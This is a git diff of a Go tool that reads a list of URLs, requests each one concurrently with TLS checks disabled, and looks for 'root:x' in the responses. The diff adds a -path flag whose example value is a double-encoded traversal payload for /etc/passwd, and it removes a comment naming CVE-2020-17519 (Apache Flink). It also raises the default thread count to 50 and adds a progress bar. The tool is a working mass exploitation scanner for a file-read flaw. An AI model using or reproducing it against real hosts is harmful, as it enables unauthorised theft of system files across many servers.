@@ -7,10 +7,13 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"net/url"
 	"os"
+	"path"
 	"strings"
 	"time"
 
+	"github.com/cheggaaa/pb/v3"
 	"github.com/zenthangplus/goccm"
 )
 
@@ -18,8 +21,9 @@ var colorRed string = "\033[31m"
 var colorReset string = "\033[0m"
 var arg1 = flag.String("file", "/tmp/URLs.txt", "file with URL's")
 var arg2 = flag.String("content", "root:x", "What to look for ?")
-var arg3 = flag.Int("threads", 10, "number of concurrent threads")
-var wg = goccm.New(*arg3)
+var arg3 = flag.Int("threads", 50, "number of concurrent threads")
+var arg4 = flag.String("path", "", "adding a path, example /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd")
+var conMan = goccm.New(*arg3)
 
 func linesInFile(fileName string) []string {
 	f, err := os.Open(fileName)
@@ -27,6 +31,7 @@ func linesInFile(fileName string) []string {
 		fmt.Println("error Opening File: ", err)
 		fmt.Println(colorRed, "Check -h for help !", colorReset)
 	}
+	defer f.Close()
 	// Create new Scanner.
 	scanner := bufio.NewScanner(f)
 	result := []string{}
@@ -39,16 +44,18 @@ func linesInFile(fileName string) []string {
 	return result
 }
 
-func getStuff(v, arg2 string) {
-	defer wg.Done()
+func getStuff(v, arg2 string, arg4 string) {
+	defer conMan.Done()
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	client := http.Client{
-		Timeout: 2 * time.Second,
+		Timeout: 5 * time.Second,
 	}
 	// fmt.Println("processing: ", v)
-	value := v
-	// add to back of urls ? CVE-2020-17519
-	// + `/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd`
+	u, err := url.Parse(v)
+	u.Path = path.Join(u.Path, arg4)
+	value := u.String() // prints http://foo/bar.html
+	//fmt.Println(value)
+	//value := v + arg4
 	resp, err := client.Get(strings.TrimSpace(value))
 	if err != nil {
 		defer func() {
@@ -72,11 +79,17 @@ func main() {
 	flag.Parse()
 	fmt.Println("Starting .....!")
 	a := linesInFile(*arg1)
-	for _, v := range a {
-		wg.Wait()
-		go getStuff(v, *arg2)
+	bar := pb.StartNew(len(a))
+	if len(a) > 0 {
+		for _, v := range a {
+			conMan.Wait()
+			bar.Increment()
+			go getStuff(v, *arg2, *arg4)
+		}
+		bar.Finish()
+		conMan.WaitAllDone()
 	}
-	wg.WaitAllDone()
+
 	fmt.Println("Done .....!")
 
 }
